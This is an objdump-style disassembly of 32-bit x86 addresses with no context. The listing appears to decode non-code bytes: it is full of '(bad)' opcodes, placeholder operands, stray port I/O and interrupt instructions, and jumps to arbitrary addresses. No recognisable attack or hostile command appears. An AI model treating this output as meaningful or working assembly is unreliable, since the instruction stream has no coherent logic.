  40fa65:	sar    DWORD PTR [esi-0x5],1
  40fa68:	jmp    0x40fa77
  40fa6a:	test   al,0x6d
  40fa6c:	and    BYTE PTR [edx],ah
  40fa6e:	stc    
  40fa6f:	xchg   esp,eax
  40fa70:	je     0x40fa0e
  40fa72:	push   ds
  40fa73:	cmp    BYTE PTR [ecx-0x6e],ch
  40fa76:	pop    ebp
  40fa77:	mov    ecx,?
  40fa79:	(bad)  
  40fa7a:	mov    eax,ds:0x248431e6
  40fa7f:	xor    edi,esp
  40fa81:	int3   
  40fa82:	mov    es,WORD PTR [edi]
  40fa84:	out    0x3c,al
  40fa86:	pop    ebx
  40fa87:	scas   al,BYTE PTR es:[edi]
  40fa88:	test   DWORD PTR [eax],eax
  40fa8a:	jp     0x40fadc
  40fa8c:	mov    al,ds:0x6d0483f5
  40fa91:	lock call 0xfe592066
  40fa97:	xchg   BYTE PTR [edx],ch
  40fa99:	data16 lock cmp al,0x2e
  40fa9d:	mov    ebp,0xb7078fce
  40faa2:	out    dx,eax
  40faa3:	or     eax,0x3909e993
  40faa8:	fcomp  QWORD PTR [eax+ecx*8-0x32]
  40faac:	cmp    al,0x50
  40faae:	fstp   DWORD PTR [edi+0xb]
  40fab1:	aad    0x3d
  40fab3:	out    dx,al
  40fab4:	fstp   QWORD PTR [edx]
  40fab6:	xor    DWORD PTR [ebx-0xd],edx
  40fab9:	xchg   ecx,eax
  40faba:	and    cl,BYTE PTR [eax+0x8]
  40fabd:	dec    edi
  40fabe:	mov    eax,ds:0xd8fdcf15
  40fac3:	adc    eax,0x9cf1923
  40fac8:	div    edi
  40faca:	inc    edi
  40facb:	(bad)  [eiz*1+0x4148511d]
  40fad2:	lahf   
  40fad3:	mov    ebp,0x23c730f2
  40fad8:	sub    ch,dh
  40fada:	inc    ecx
  40fadb:	loop   0x40fa84
  40fadd:	mov    eax,0xddd49ab7
  40fae2:	dec    ebp
  40fae3:	inc    esi
  40fae4:	inc    ebp
  40fae5:	sbb    eax,0x5ceaaf3e
  40faea:	mov    DWORD PTR [ebp+0x49],edx
  40faed:	jg     0x40face
  40faef:	cmp    eax,0x3c02c21f
  40faf4:	or     dl,BYTE PTR [ebx-0x40]
  40faf7:	les    esi,FWORD PTR [edi-0x704843b9]
  40fafd:	sbb    al,0xd8
  40faff:	add    DWORD PTR [ebx],edi
  40fb01:	cmp    al,0x1c
  40fb03:	ret    0x8b88
  40fb06:	iret   
  40fb07:	mov    cl,BYTE PTR [ebx+edi*2-0x6afc8127]
  40fb0e:	inc    edi
  40fb0f:	sbb    BYTE PTR [eax],al
  40fb11:	ret    
  40fb12:	dec    esp
  40fb13:	mov    ebx,0xb64aba11
  40fb18:	inc    ecx
  40fb19:	cmp    al,0xf1
  40fb1b:	repz jle 0x40faf3
  40fb1e:	sbb    eax,0x9e9dec15
  40fb23:	ret    
  40fb24:	(bad)  [edx]
  40fb26:	inc    edx
  40fb27:	cmp    edi,DWORD PTR [ebx]
  40fb29:	jo     0x40fb6e
  40fb2b:	shr    BYTE PTR [ebx+0x72],1
  40fb2e:	inc    esp
  40fb2f:	in     al,0xd
  40fb31:	pop    ss
  40fb32:	jbe    0x40fb9a
  40fb34:	jno    0x40fb2c
  40fb36:	pop    ds
  40fb37:	xchg   ecx,eax
  40fb38:	jns    0x40fb74
  40fb3a:	inc    edi
  40fb3b:	(bad)  
  40fb3c:	ds cli 
  40fb3e:	js     0x40fb58
  40fb40:	test   eax,0xbc9be2f6
  40fb46:	sar    DWORD PTR [ebx+0x198c629],cl
  40fb4c:	mov    bl,0x92
  40fb4e:	xchg   esi,eax
  40fb4f:	(bad)  
  40fb50:	cli    
  40fb51:	addr16 pusha 
  40fb53:	jmp    0x6746:0x73c45b06
  40fb5a:	push   edi
  40fb5b:	int3   
  40fb5c:	(bad)  
  40fb5d:	in     eax,dx
  40fb5e:	fdivr  QWORD PTR [eax+0x56]
  40fb61:	mov    esi,0xdafb4f5e
  40fb66:	gs cmc 
  40fb68:	add    dl,cl
  40fb6a:	push   0xffffff86
  40fb6c:	inc    edx
  40fb6d:	jbe    0x40fb7b
  40fb6f:	rcr    BYTE PTR [ebx+0x1a5caf75],1
  40fb75:	ret    0xbd40
  40fb78:	push   cs
  40fb79:	in     eax,0xac
  40fb7b:	sbb    al,0x9a
  40fb7d:	inc    ebp
  40fb7e:	jae    0x40fb9f
  40fb80:	mov    al,0x94
  40fb82:	test   al,0x73
  40fb84:	cs cmp eax,0x107bd470
  40fb8a:	or     esp,ecx
  40fb8c:	push   0xd92b13fc
  40fb91:	xlat   BYTE PTR ds:[ebx]
  40fb92:	xchg   edi,esp
  40fb94:	sub    DWORD PTR [ebp-0x3],esp
  40fb97:	scas   al,BYTE PTR es:[edi]
  40fb98:	sahf   
  40fb99:	(bad)  
  40fb9a:	lock sahf 
  40fb9c:	jo     0x40fb79
  40fb9e:	jbe    0x40fb4d
  40fba0:	fwait
  40fba1:	das    
  40fba2:	fiadd  WORD PTR [ebp+0x3237ef90]
  40fba8:	(bad)  
  40fba9:	aam    0x77
  40fbab:	add    edi,DWORD PTR [esi-0x5e]
  40fbae:	retf   0x9d8d
  40fbb1:	jnp    0x40fc1f
  40fbb3:	aam    0x5d
  40fbb5:	push   edi
  40fbb6:	imul   ebp,DWORD PTR [ecx-0x6a],0xbb1dc2
  40fbbd:	sbb    BYTE PTR [edx+0x28],bl
  40fbc0:	mov    DWORD PTR [ebp+0x65],edx
  40fbc3:	das    
  40fbc4:	cmp    ch,ch
  40fbc6:	dec    ebx
  40fbc7:	mov    WORD PTR [ecx+0x56bf541f],?
  40fbcd:	dec    edx
  40fbce:	jns    0x40fbf6
  40fbd0:	cld    
  40fbd1:	int    0x91
  40fbd3:	sub    eax,0x444cd6f8
  40fbd8:	in     eax,0x78
  40fbda:	xor    eax,DWORD PTR [esi-0x2]
  40fbdd:	pop    edx
  40fbde:	int3   
  40fbdf:	sub    eax,0x473393ff
  40fbe4:	in     al,0xfa
  40fbe6:	rcl    edi,0xf5
  40fbe9:	(bad)  
  40fbea:	ror    DWORD PTR [edi+0x5d431c3d],1
  40fbf0:	jae    0x40fbc9
  40fbf2:	call   0xe318:0x383c46d5
  40fbf9:	stc    
  40fbfa:	inc    esp
  40fbfb:	and    DWORD PTR [ecx+0x4ceec4d9],ecx
  40fc01:	stos   BYTE PTR es:[edi],al
  40fc02:	pop    ebx
  40fc03:	(bad)  
  40fc04:	out    0x71,eax
  40fc06:	ss dec esp
  40fc08:	adc    esp,0xfffffffa
  40fc0b:	pop    ds
  40fc0c:	adc    edi,DWORD PTR [edx-0x21a5b2a2]
  40fc12:	retf   
  40fc13:	xor    BYTE PTR [ebx+eax*2+0x24472f91],bl
  40fc1a:	mov    dl,0x6e
  40fc1c:	shl    BYTE PTR [ecx],cl
  40fc1e:	je     0x40fba4
  40fc20:	dec    edi
  40fc21:	loopne 0x40fc68
  40fc23:	add    ah,BYTE PTR [edi-0x2f74ed3f]
  40fc29:	leave  
  40fc2a:	jbe    0x40fc73
  40fc2c:	scas   al,BYTE PTR es:[edi]
  40fc2d:	jb     0x40fbf7
  40fc2f:	rcl    BYTE PTR [edi+0x1b35867a],cl
  40fc35:	imul   eax,DWORD PTR [esi-0x70],0x1b
  40fc39:	xchg   ecx,eax
  40fc3a:	mov    bh,0x31
  40fc3c:	psubsb mm3,QWORD PTR [edi+ecx*2-0x7506abe4]
  40fc44:	in     ax,dx
  40fc46:	push   0xffffffb8
  40fc48:	dec    edi
  40fc49:	pop    ebp
  40fc4a:	push   edi
  40fc4b:	(bad)  [ebx]
  40fc4d:	fcomp  QWORD PTR [edx-0x1]
  40fc50:	mov    DWORD PTR [esi],esi
  40fc52:	loopne 0x40fc59
  40fc54:	cmp    ch,BYTE PTR [ebp+0x70]
  40fc57:	or     DWORD PTR [edx],edi
  40fc59:	jmp    0x40fcd8
  40fc5b:	mov    ch,0x3
  40fc5d:	fwait
  40fc5e:	inc    edi
  40fc5f:	aad    0x34
  40fc61:	adc    DWORD PTR cs:[eax],ebp
  40fc64:	xchg   ecx,eax
  40fc65:	sbb    edi,edx
  40fc67:	into   
  40fc68:	jmp    0x40fc9f
  40fc6a:	out    0xe8,al
  40fc6c:	cmc    
  40fc6d:	xor    BYTE PTR ds:0xfdf4b1f8,al
  40fc73:	out    0x6a,al
  40fc75:	aas    
  40fc76:	and    al,al
  40fc78:	pusha  
  40fc79:	int    0x9c
  40fc7b:	jge    0x40fcd7
  40fc7d:	jmp    0xeafde59f
  40fc82:	pop    edx
  40fc83:	mov    al,ds:0x9a070935
  40fc88:	add    esp,eax
  40fc8a:	pop    esp
  40fc8b:	(bad)  
  40fc8c:	mov    ds:0x98539747,eax
  40fc91:	clc    
  40fc92:	mov    bl,0x97
  40fc94:	dec    edi
  40fc95:	mov    ebx,0x3014a34c
  40fc9a:	stos   DWORD PTR es:[edi],eax
  40fc9b:	retf   
  40fc9c:	sbb    esi,DWORD PTR [esi-0x1b]
  40fc9f:	mov    eax,ds:0x9d418983
  40fca4:	out    dx,al
  40fca5:	and    al,0x93
  40fca7:	(bad)
  40fcaa:	fwait
  40fcab:	mov    ah,0x26
  40fcad:	mov    ds:0x183b25f7,al
  40fcb2:	adc    ch,BYTE PTR [ebx]
  40fcb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcb5:	push   esp
  40fcb6:	jmp    0x40fd06
  40fcb8:	(bad)  
  40fcb9:	sub    eax,0xa764efb2
  40fcbe:	push   eax
  40fcbf:	mov    ebp,0xef7093b5
  40fcc4:	push   ebx
  40fcc5:	popa   
  40fcc6:	cmp    BYTE PTR [ebx-0x74],dl
  40fcc9:	inc    ecx
  40fcca:	cmc    
  40fccb:	dec    ebp
  40fccc:	ret    0x3674
  40fccf:	mov    edi,0xda04c3d7
  40fcd4:	retf   0xf4
  40fcd7:	push   DWORD PTR [ecx+0x63]
  40fcda:	push   0xffffffcf
  40fcdc:	addr16 das 
  40fcde:	and    ah,bl
  40fce0:	mov    al,ds:0x22335ffb
  40fce5:	mov    ds:0xb34a20f7,eax
  40fcea:	push   ebx
  40fceb:	fidiv  DWORD PTR [edi]
  40fced:	jg     0x40fcc0
  40fcef:	xor    eax,0x549b40ef
  40fcf4:	out    0xae,al
  40fcf6:	inc    esi
  40fcf7:	cmp    al,0xfa
  40fcf9:	cmp    edi,esi
  40fcfb:	pop    esi
  40fcfc:	push   edi
  40fcfd:	lods   eax,DWORD PTR ds:[esi]
  40fcfe:	fidiv  WORD PTR [eax]
  40fd00:	jno    0x40fd23
  40fd02:	dec    ecx
  40fd03:	call   0xde4e:0x8b965572
  40fd0a:	call   0x50853051
  40fd0f:	mov    ecx,0xec762dc4
  40fd14:	mov    ebp,0xdacea103
  40fd19:	lds    ecx,FWORD PTR [edi-0x6348544e]
  40fd1f:	pop    ss
  40fd20:	bound  ecx,QWORD PTR [ecx]
  40fd22:	mov    eax,ds:0x61947a9f
  40fd27:	mov    ds:0xf591d3c8,eax
  40fd2c:	rcl    DWORD PTR [esi+0x7f],0xd
  40fd30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd31:	and    dh,ch
  40fd33:	je     0x40fd2d
  40fd35:	fcmovnu st,st(4)
  40fd37:	or     dl,0xf8
  40fd3a:	ins    DWORD PTR es:[edi],dx
  40fd3b:	faddp  st(1),st
  40fd3d:	inc    edx
  40fd3e:	in     al,dx
  40fd3f:	test   al,0x2e
  40fd41:	or     bh,BYTE PTR ds:0xb7895721
  40fd47:	(bad)  
  40fd48:	dec    esi
  40fd49:	or     DWORD PTR [eax],0xffffffe3
  40fd4c:	ret    
  40fd4d:	push   es
  40fd4e:	xchg   esp,eax
  40fd4f:	inc    ebp
  40fd50:	pcmpgtb mm7,QWORD PTR [esi]
  40fd53:	fwait
  40fd54:	test   al,0xf9
  40fd56:	jp     0x40fdaf
  40fd58:	ret    
  40fd59:	pop    eax
  40fd5a:	int    0xde
  40fd5c:	pop    ds
  40fd5d:	push   eax
  40fd5e:	cwde   
  40fd5f:	or     DWORD PTR [edx-0x11],ebp
  40fd62:	push   eax
  40fd63:	mov    ds:0xd46822e9,al
  40fd68:	sbb    al,0x91
  40fd6a:	sub    DWORD PTR [eax],esp
  40fd6c:	aas    
  40fd6d:	hlt    
  40fd6e:	repz pop ss
  40fd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd71:	push   ss
  40fd72:	pop    edx
  40fd73:	ins    BYTE PTR es:[edi],dx
  40fd74:	repnz rcr DWORD PTR ds:0xb1449b89,0x58
  40fd7c:	and    eax,0x127ad168
  40fd81:	adc    bh,BYTE PTR [ecx+0x8]
  40fd84:	aaa    
  40fd85:	inc    ebx
  40fd86:	xchg   ebx,eax
  40fd87:	test   eax,0xf190605f
  40fd8c:	adc    ah,al
  40fd8e:	xor    DWORD PTR [ebx],ebx
  40fd90:	inc    edi
  40fd91:	ret    
  40fd92:	call   0xb1438024
  40fd97:	or     eax,0x92a07120
  40fd9c:	ror    DWORD PTR [ebp-0x12],cl
  40fd9f:	int3   
  40fda0:	sub    bh,BYTE PTR [edi-0x2326894]
  40fda6:	lea    ebp,[ebx+eax*8-0x45697908]
  40fdad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdae:	push   eax
  40fdaf:	push   ebx
  40fdb0:	pop    ebx
  40fdb1:	scas   al,BYTE PTR es:[edi]
  40fdb2:	lds    ebp,FWORD PTR es:[esi]
  40fdb5:	push   ds
  40fdb6:	scas   al,BYTE PTR es:[edi]
  40fdb7:	xor    BYTE PTR [edx],bl
  40fdb9:	jns    0x40fdd9
  40fdbb:	neg    DWORD PTR [eax]
  40fdbd:	xchg   edx,eax
  40fdbe:	clc    
  40fdbf:	fld    TBYTE PTR [ebp+0x7611bef]
  40fdc5:	adc    ebx,eax
  40fdc7:	and    ebp,ebx
  40fdc9:	jns    0x40fdd8
  40fdcb:	and    al,0xee
  40fdcd:	repz xlat BYTE PTR ds:[ebx]
  40fdcf:	test   bl,bl
  40fdd1:	mov    ds:0xeb1f4f3b,eax
  40fdd6:	jmp    0x40fe19
  40fdd8:	cs inc edi
  40fdda:	jl     0x40fe08
  40fddc:	fiadd  WORD PTR [ebp-0x3]
  40fddf:	mov    dh,bh
  40fde1:	sbb    ebp,edx
  40fde3:	dec    edx
  40fde4:	dec    BYTE PTR [eax-0x6f]
  40fde7:	clc    
  40fde8:	cmp    DWORD PTR [ebx+0x56],eax
  40fdeb:	cdq    
  40fdec:	adc    bl,BYTE PTR [bx+si-0x39]
  40fdf0:	xchg   esi,eax
  40fdf1:	fmul   DWORD PTR [edx+eiz*1+0x45]
  40fdf5:	jl     0x40fe46
  40fdf7:	pop    ecx
  40fdf8:	add    dl,al
  40fdfa:	mov    DWORD PTR [eax-0x1d48a67],esp
  40fe00:	retf   0x2cce
  40fe03:	or     ebp,DWORD PTR [ebx-0x58587df8]
  40fe09:	lock mov esp,0x7d51952f
  40fe0f:	cmp    dh,BYTE PTR [ecx-0x6d]
  40fe12:	cmp    eax,ebp
  40fe14:	retf   
  40fe15:	sti    
  40fe16:	add    BYTE PTR [esi+eiz*1-0x177c49d3],0xbf
  40fe1e:	dec    eax
  40fe1f:	in     al,0xe4
  40fe21:	mov    eax,ds:0xd97837e1
  40fe26:	mov    al,0xcc
  40fe28:	mov    ds:0xbdee8920,eax
  40fe2d:	lods   eax,DWORD PTR ds:[esi]
  40fe2e:	sti    
  40fe2f:	outs   dx,BYTE PTR ds:[esi]
  40fe30:	pusha  
  40fe31:	dec    edi
  40fe32:	push   ebx
  40fe33:	aad    0xff
  40fe35:	loop   0x40fe48
  40fe37:	popa   
  40fe38:	retf   0xbefe
  40fe3b:	sub    dh,bl
  40fe3d:	jno    0x40fe71
  40fe3f:	and    edx,0x6be378ab
  40fe45:	sub    DWORD PTR [edx+0x5e],0xffffffec
  40fe49:	mov    ds:0xf1ad004c,eax
  40fe4e:	lahf   
  40fe4f:	fnsave [eax]
  40fe51:	pop    ecx
  40fe52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe53:	pop    ebx
  40fe54:	add    al,0xa7
  40fe56:	mov    al,0x5d
  40fe58:	lods   eax,DWORD PTR ds:[esi]
  40fe59:	push   cs
  40fe5a:	or     eax,DWORD PTR [ecx+0x64116382]
  40fe60:	sbb    al,bh
  40fe62:	int3   
  40fe63:	mov    ch,0x1f
  40fe65:	sbb    al,0xe2
  40fe67:	add    BYTE PTR [eax-0x4e7652e],0x5b
  40fe6e:	outs   dx,BYTE PTR ds:[esi]
  40fe6f:	sub    eax,0xf3316e5a
  40fe74:	or     al,0xbe
  40fe76:	push   cs
  40fe77:	stos   BYTE PTR es:[edi],al
  40fe78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe79:	add    al,0x52
  40fe7b:	popa   
  40fe7c:	mov    ecx,0x27037b8d
  40fe81:	cdq    
  40fe82:	sar    BYTE PTR [ecx+ebp*4-0x19],1
  40fe86:	std    
  40fe87:	ins    BYTE PTR es:[edi],dx
  40fe88:	in     eax,0xe2
  40fe8a:	xchg   esi,eax
  40fe8b:	pop    ecx
  40fe8c:	xchg   edx,eax
  40fe8d:	add    ebp,DWORD PTR [edi-0x39]
  40fe90:	pop    es
  40fe91:	inc    eax
  40fe92:	mov    esp,DWORD PTR [ebx-0x60]
  40fe95:	scas   al,BYTE PTR es:[edi]
  40fe96:	and    DWORD PTR [eax-0x4f93b2e1],edx
  40fe9c:	mov    eax,0x948614df
  40fea1:	xchg   esp,eax
  40fea2:	push   edi
  40fea3:	int    0xa7
  40fea5:	gs out dx,eax
  40fea7:	mov    al,0x84
  40fea9:	and    al,BYTE PTR [eax-0x31]
  40feac:	push   es
  40fead:	stc    
  40feae:	(bad)  
  40feaf:	mov    edx,0x559a1155
  40feb4:	pop    ebx
  40feb5:	ja     0x40ff0f
  40feb7:	shr    DWORD PTR [ecx+0x6fe68b8b],cl
  40febd:	(bad)  
  40febe:	fbld   TBYTE PTR [edx+0x5a]
  40fec1:	xchg   esi,eax
  40fec2:	cmp    DWORD PTR [eax+0x76],ecx
  40fec5:	mov    edi,0x7a4ae99f
  40feca:	jecxz  0x40ff41
  40fecc:	dec    edi
  40fecd:	adc    BYTE PTR [edi-0x6d],0x1e
  40fed1:	test   BYTE PTR [esp+edi*4],bl
  40fed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fed5:	jns    0x40feb8
  40fed7:	inc    ecx
  40fed8:	add    DWORD PTR [ecx+esi*4+0x38338b1f],ebx
  40fedf:	jmp    0xac26e0d7
  40fee4:	arpl   WORD PTR [edx],si
  40fee6:	test   ecx,ecx
  40fee8:	ja     0x40ff00
  40feea:	push   esp
  40feeb:	cmp    ebp,edx
  40feed:	jns    0x40ff2e
  40feef:	ret    0x6b4d
  40fef2:	es inc ecx
  40fef4:	cdq    
  40fef5:	ffree  st(6)
  40fef7:	es sbb eax,0x9f8f2322
  40fefd:	int3   
  40fefe:	sub    bl,BYTE PTR [edi+0x402b2579]
  40ff04:	int3   
  40ff05:	pop    es
  40ff06:	outs   dx,BYTE PTR ds:[esi]
  40ff07:	ficom  DWORD PTR [edi]
  40ff09:	add    BYTE PTR [ecx-0x21a585e3],0xbb
  40ff10:	adc    bh,bh
  40ff12:	sub    eax,ecx
  40ff14:	enter  0xb489,0xc9
  40ff18:	dec    ebp
  40ff19:	xor    al,0xb1
  40ff1b:	out    0x50,al
  40ff1d:	cmp    al,0xfa
  40ff1f:	inc    ebx
  40ff20:	fadd   QWORD PTR [esp+ebx*4+0x67]
  40ff24:	aam    0x5
  40ff26:	js     0x40fec0
  40ff28:	xchg   ecx,eax
  40ff29:	inc    ecx
  40ff2a:	retf   
  40ff2b:	imul   ebx,edx,0x50
  40ff2e:	shr    bl,0xc7
  40ff31:	pop    esi
  40ff32:	pop    edx
  40ff33:	(bad)  
  40ff35:	icebp  
  40ff36:	mov    ebp,0x902dd8d1
  40ff3b:	sbb    DWORD PTR [edi-0x9530d19],0xfffffff8
  40ff42:	ret    0x358f
  40ff45:	(bad)  
  40ff46:	jecxz  0x40fedf
  40ff48:	mov    cl,0x97
  40ff4a:	mov    ds:0x3e488aa5,al
  40ff4f:	ins    BYTE PTR es:[edi],dx
  40ff50:	lds    edx,FWORD PTR [ebx+0x54]
  40ff53:	enter  0x4fd,0xb6
  40ff57:	test   BYTE PTR [edx],al
  40ff59:	xchg   ebp,eax
  40ff5a:	ss dec esp
  40ff5c:	retf   0xbc4
  40ff5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff60:	cdq    
  40ff61:	sbb    cl,ah
  40ff63:	cwde   
  40ff64:	dec    ecx
  40ff65:	je     0x40ffc4
  40ff67:	loop   0x40feff
  40ff69:	iret   
  40ff6a:	push   esp
  40ff6b:	mov    bh,0xad
  40ff6d:	fstp   QWORD PTR [eax+0x12ad8b55]
  40ff73:	xor    al,0xb1
  40ff75:	ja     0x40ff61
  40ff77:	aad    0xce
  40ff79:	aas    
  40ff7a:	and    al,0x29
  40ff7c:	out    dx,eax
  40ff7d:	inc    ebx
  40ff7e:	das    
  40ff7f:	loopne 0x40ff9c
  40ff81:	loope  0x410002
  40ff83:	iret   
  40ff84:	mov    edx,0x9b344d4d
  40ff89:	stos   BYTE PTR es:[edi],al
  40ff8a:	adc    al,0xd1
  40ff8c:	jb     0x40ff0f
  40ff8e:	arpl   WORD PTR [esi+0x1acfc608],ax
  40ff94:	inc    esi
  40ff95:	and    ecx,edx
  40ff97:	in     eax,dx
  40ff98:	push   0x65
  40ff9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff9b:	sub    esp,DWORD PTR [eax-0x22a1511b]
  40ffa1:	mov    bl,0xc0
  40ffa3:	jge    0x410013
  40ffa5:	mov    al,ch
  40ffa7:	xchg   ebx,eax
  40ffa8:	xchg   edi,eax
  40ffa9:	jl     0x40ffcf
  40ffab:	xlat   BYTE PTR ds:[ebx]
  40ffac:	lahf   
  40ffad:	xor    al,0x62
  40ffaf:	or     eax,0x71919c0f
  40ffb4:	in     eax,dx
  40ffb5:	lea    ebx,[edi]
  40ffb7:	push   esi
  40ffb8:	adc    al,0xda
  40ffba:	ins    BYTE PTR es:[edi],dx
  40ffbb:	xor    edi,DWORD PTR [ecx]
  40ffbd:	pop    edx
  40ffbe:	call   0xb10a80e2
  40ffc3:	mov    WORD PTR [esi+0x3f01a8e0],cs
  40ffc9:	(bad)  
  40ffca:	movzx  eax,WORD PTR [edi-0x7d]
  40ffce:	stc    
  40ffcf:	mov    al,ds:0x3de81fcb
  40ffd4:	xchg   ebp,eax
  40ffd5:	mov    ah,0xfc
  40ffd7:	pop    edx
  40ffd8:	ret    
  40ffd9:	jg     0x410023
  40ffdb:	imul   edx,eax,0x0
  40ffde:	xchg   DWORD PTR [ebp+0x2a],ebp
  40ffe1:	popa   
  40ffe2:	cmp    eax,0x17a04637
  40ffe7:	sub    BYTE PTR [ecx],0xe5
  40ffea:	dec    eax
  40ffeb:	mov    bl,0xf3
  40ffed:	fiadd  DWORD PTR [ebp+eiz*1-0x15]
  40fff1:	jae    0x41006a
  40fff3:	out    dx,eax
  40fff4:	cmp    al,BYTE PTR [ebx+esi*8]
  40fff7:	aaa    
  40fff8:	sbb    ebx,0x77
  40fffb:	or     eax,0xff25bb1c
  410000:	sbb    DWORD PTR [ecx+0x2dc049ce],ebp
  410006:	xor    eax,0xc6d7584d
  41000b:	or     dh,BYTE PTR [edi]
  41000d:	gs dec ebx
  41000f:	push   edi
  410010:	retf   0x3733
  410013:	in     al,dx
  410014:	push   0xffffff86
  410016:	mov    bl,0x50
  410018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410019:	mov    bl,0x6f
  41001b:	rol    BYTE PTR [esi+0x66],0x88
  41001f:	xor    bl,BYTE PTR [ebx-0x3c]
  410022:	mov    esp,DWORD PTR [esi+ecx*8]
  410025:	lods   eax,DWORD PTR ds:[esi]
  410026:	pop    edi
  410027:	or     al,0x9a
  410029:	dec    edi
  41002a:	cmp    al,0x92
  41002c:	(bad)  
  41002d:	neg    DWORD PTR [edi+ebp*1-0x30]
  410031:	rol    DWORD PTR [eax],cl
  410033:	sub    BYTE PTR ds:0x138a2c2e,bl
  410039:	fxch   st(5)
  41003b:	pushf  
  41003c:	sub    al,0xab
  41003e:	mov    ebx,0xef781be1
  410043:	nop
  410044:	and    eax,0x66ec2ccb
  410049:	fst    st(7)
  41004b:	cmp    eax,0x55b4bd52
  410050:	fwait
  410051:	pop    es
  410052:	mov    ds:0x50d3ea63,al
  410057:	add    al,0x14
  410059:	mov    eax,0x9a0dcba7
  41005e:	(bad)  
  41005f:	(bad)  
  410060:	mov    dh,0xe7
  410062:	in     eax,dx
  410063:	pushf  
  410064:	xchg   ebp,eax
  410065:	fstp   TBYTE PTR [eax+edi*4]
  410068:	and    ah,dh
  41006a:	mov    dh,BYTE PTR [ebx]
  41006c:	pop    ds
  41006d:	pop    eax
  41006e:	sub    BYTE PTR [ecx],dl
  410070:	fmul   DWORD PTR [ecx+eiz*4-0x3931e848]
  410077:	das    
  410078:	mov    al,ds:0x9a7491f0
  41007d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41007e:	loope  0x41003d
  410080:	rcr    ebp,0xd4
  410083:	cld    
  410084:	mov    DWORD PTR [ebx+0x67c6ef23],edi
  41008a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41008b:	test   eax,0x17aeb011
  410090:	icebp  
  410091:	outs   dx,DWORD PTR ds:[esi]
  410092:	pop    ecx
  410093:	add    esi,ebp
  410095:	in     al,dx
  410096:	mov    esi,0xc7f7b475
  41009b:	sub    dh,BYTE PTR [edi-0x1d084c7a]
  4100a1:	(bad)  
  4100a2:	sbb    al,0xf7
  4100a4:	sti    
  4100a5:	test   DWORD PTR [esi],esp
  4100a7:	rcr    DWORD PTR [edi],cl
  4100a9:	xor    edi,DWORD PTR [eax+0x2c]
  4100ac:	sub    eax,0x73991499
  4100b1:	sbb    edi,esi
  4100b3:	xor    al,BYTE PTR [esi]
  4100b5:	mov    ebp,0xade16633
  4100ba:	sub    DWORD PTR [edx+0x4fcc2e51],esp
  4100c0:	loopne 0x410094
  4100c2:	sti    
  4100c3:	or     al,BYTE PTR [esi+0x5f08aa26]
  4100c9:	scas   eax,DWORD PTR es:[edi]
  4100ca:	sub    cl,BYTE PTR [edx]
  4100cc:	ret    
  4100cd:	push   esi
  4100ce:	sbb    dh,BYTE PTR [si-0x6dbc]
  4100d3:	(bad)  
  4100d4:	mov    ecx,0xd82ca565
  4100d9:	or     dh,BYTE PTR [ecx+0x628f79ed]
  4100df:	sbb    al,0xdd
  4100e1:	cmp    al,0x9d
  4100e3:	cmp    ah,0x25
  4100e6:	icebp  
  4100e7:	ins    DWORD PTR es:[edi],dx
  4100e8:	sbb    edi,edx
  4100ea:	and    al,0x33
  4100ec:	jns    0x4100c6
  4100ee:	add    bl,BYTE PTR [ebp-0x6af6e80a]
  4100f4:	in     eax,dx
  4100f5:	and    BYTE PTR ds:[ecx-0x3d864f63],al
  4100fc:	call   0x6ad848a9
  410101:	in     al,dx
  410102:	aad    0xd5
  410104:	mov    al,0xcb
  410106:	int3   
  410107:	sub    eax,esp
  410109:	and    eax,0xc14dde24
  41010e:	aad    0xdc
  410110:	push   ds
  410111:	xor    bh,BYTE PTR [ecx+eax*4+0x49]
  410115:	(bad)  
  410116:	adc    al,0xd3
  410118:	mov    bh,0xb2
  41011a:	imul   ebp,DWORD PTR [eax-0x76],0xffffffb7
  41011e:	adc    BYTE PTR [esi],0x3d
  410121:	loope  0x41019b
  410123:	mov    ?,WORD PTR ds:0x6bf2b4e8
  410129:	push   esp
  41012a:	jbe    0x410177
  41012c:	(bad)
  41012f:	mov    cl,0xb6
  410131:	push   ebx
  410132:	test   BYTE PTR [ebp+0x77c26bf5],bh
  410138:	mov    esp,ecx
  41013a:	xchg   ecx,eax
  41013b:	and    edx,DWORD PTR [edx]
  41013d:	cmp    al,0xcb
  41013f:	mov    ds:0x75b904a4,ax
  410145:	sub    al,BYTE PTR [edx-0x27]
  410148:	xchg   edx,eax
  410149:	ss jg  0x410167
  41014c:	mov    esi,0x15cbf28c
  410151:	daa    
  410152:	xchg   edx,eax
  410153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410154:	push   edx
  410155:	cmc    
  410156:	xchg   ecx,eax
  410157:	iret   
  410158:	dec    ecx
  410159:	test   eax,0xc8713d3a
  41015e:	shr    edi,1
  410160:	mov    ch,0xd4
  410162:	mov    al,0x8e
  410164:	push   ds
  410165:	push   es
  410166:	cmp    al,0x4a
  410168:	arpl   WORD PTR gs:[ebx-0x53],dx
  41016c:	pop    esp
  41016d:	cmc    
  41016e:	repnz xor BYTE PTR [edx+0x31],cl
  410172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410173:	nop
  410174:	and    al,0xbe
  410176:	mov    ah,0x89
  410178:	and    al,0xe5
  41017a:	cmp    eax,0xa185e913
  41017f:	outs   dx,BYTE PTR ds:[esi]
  410180:	(bad)  
  410181:	out    dx,al
  410182:	gs ret 0x4382
  410186:	mov    bl,0x3a
  410188:	clc    
  410189:	fisubr DWORD PTR [ebx+0xc8dbd18]
  41018f:	lods   al,BYTE PTR ds:[esi]
  410190:	scas   al,BYTE PTR es:[edi]
  410191:	nop
  410192:	outs   dx,BYTE PTR ds:[esi]
  410193:	test   BYTE PTR [esi+edi*2],dh
  410196:	dec    eax
  410197:	les    edx,FWORD PTR [ebp+0x4]
  41019a:	cwde   
  41019b:	clc    
  41019c:	sub    dl,BYTE PTR [esi+esi*2+0x36]
